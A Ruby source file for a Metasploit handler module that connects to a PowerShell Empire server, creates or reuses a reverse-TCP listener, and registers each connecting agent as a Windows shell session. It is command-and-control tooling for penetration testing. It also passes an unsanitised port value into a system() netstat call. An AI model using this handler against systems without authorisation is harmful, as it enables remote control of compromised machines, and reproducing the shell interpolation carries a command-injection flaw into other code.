# -*- coding: binary -*-
require 'socket'
require 'resolv-replace'
require 'thread'
require 'msf/core/empire_lib.rb'
require 'msf/core/session_manager.rb'
require 'msf/base/sessions/empire.rb'
require 'msf/base'

module Msf
  module Handler
    module EmpireReverseTcp
      include Msf::Handler

      #
      # Returns the string representation of the handler type, in this case
      # 'reverse_tcp'.
      #
      def self.handler_type
        "reverse_tcp"
      end

      #
      # Returns the connection-described general handler type, in this case
      # 'reverse'.
      #
      def self.general_handler_type
        "reverse"
      end

      #
      # Initializes the reverse TCP handler and ads the options that are required
      # for all reverse TCP payloads, like local host and local port.
      #
      def initialize(info = {})
        super
      end

      # A string suitable for displaying to the user
      #
      # @return [String]
      def human_name
        "reverse TCP"
      end

      #
      # Starts monitoring for an inbound connection.
      #
      def start_handler
        #Defing thread methods for the handler
        #Main handler method
        #
        #Define class variables
        #
        @port = datastore['LPORT']
        @host = datastore['LHOST']
        def main
          def validate(lhost, lport)
            #Validating user inputs
            #LPORT
            ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
            if lhost != ip.ip_address
              raise "Invalid Local address. Please check your local IP."
            end
            #LPORT
            if system("netstat -nlt | grep #{lport} >> /dev/null")
              raise "Port #{lport} is already in use."
            end
          end
          #Storing user inputs
          @empire_username = datastore['EmpireUser']
          @empire_password = datastore['EmpirePass']
          @listener_name = datastore['ListenerName']
          #
          #Validate environment to check if Empire is running at 1337
          #
          raise "No Empire instance found. Please initiate Empire at 1337 before starting MSF" if not system("netstat -nlt | grep 1337 >> /dev/null")
          #
          #Creating an Empire Instance
          #
          @client_emp = Msf::Empire::Client.new(@empire_username, @empire_password)
          #
          #Continue directly to listen if the listener name mentioned is
          #already up and running, else start another listener with listener
          #name (if provided) or a random listener name
          #
          if datastore['ListenerName']
            #Check if listener name already exists
            response = @client_emp.is_listener_active(@listener_name)
            if response.to_s == false

              #If listener name not found, check if an empire listener is
              #already listening over that port
              if @client_emp.is_port_active(@port) == false
                print_error("Listener name provided not found. Trying to create one.")
                validate(@host, @port)
                responseListener = @client_emp.create_listener(@listener_name, @host, @port)
                if responseListener.to_s.include?("Failed")
                  raise(responseListener.to_s)
                else
                  print_status(responseListener.to_s)
                end
              else
                print_status("#{@client_emp.is_port_active(@port)} is listening over port : #{@port}")
              end
            else
              print_status(response.to_s)
            end
          else
            #Check if an Empire listener is already active over the mentioned
            #port
            if @client_emp.is_port_active(@port) == false
              @listener_name = "ListenerEmpire#{rand(1..1000)}"
              validate(@host, @port)
              responseListener = @client_emp.create_listener(@listener_name, @host, @port)
              if responseListener.to_s.include?("Failed")
                raise(responseListener.to_s)
              else
                print_status(responseListener.to_s)
              end
            else
              print_status("#{@client_emp.is_port_active(@port)} is listening over port : #{@port}")
            end
          end
        end

        #Method to listen for inbound connenctions
        def handle_sessions
          sleep(10)
          sessionManager = Msf::SessionManager.new(framework)
          @agentsConnected = {}
          @agentsLogged = []
          print_line
          print_status("Waiting for agents to connect back")
          listenerLocal = @client_emp.is_port_active(@port)

          #Retrieving connected agents at an interval of 6 seconds
          while @client_emp.is_listener_active(listenerLocal).to_s.include?("active") do
            sleep(6)
            staticCount = 0
            break if @client_emp.is_listener_active(listenerLocal) == false
            if not @client_emp.get_agents.include?("connected")
              @agentsConnected = @client_emp.get_agents()
            end

            #Iterating through the connected agents if hash is not empty
            if not @agentsConnected.empty?
              @agentsConnected.each do |listener, session_id|
                if listener == listenerLocal
                  if @agentsLogged.any?
                    @agentsLogged.each do |agents|
                      if session_id == agents
                        staticCount = staticCount + 1
                      end
                    end
                  else
                    if staticCount == 0
                      print_status("Agent Connected : #{session_id}. #{@client_emp.handler_details(@host, @port, session_id)}")
                      empireSession = Msf::Sessions::EmpireShellWindows.new(@client_emp, session_id)
                      sessionManager.register(empireSession)
                      @agentsLogged.push(session_id)
                    end
                  end
                end
              end
            end
          end
        end
        main()
        handle_sessions()
      end

      #
      # Stops monitoring for an inbound connection.
      #
      def stop_handler
        listenerLocal = @client_emp.is_port_active(@port)
        print_status("Terminating #{listenerLocal}")
        @client_emp.kill_listener(listenerLocal)
      end

      # Closes the listener socket if one was created.
      #
      def cleanup_handler
        #command = "kill 9 $(lsof -t -i:1337)"
        #value = system(command)
        #if value
        #  print_status ("Handler Successfully Stopped")
        #end
      end
    end
  end
end

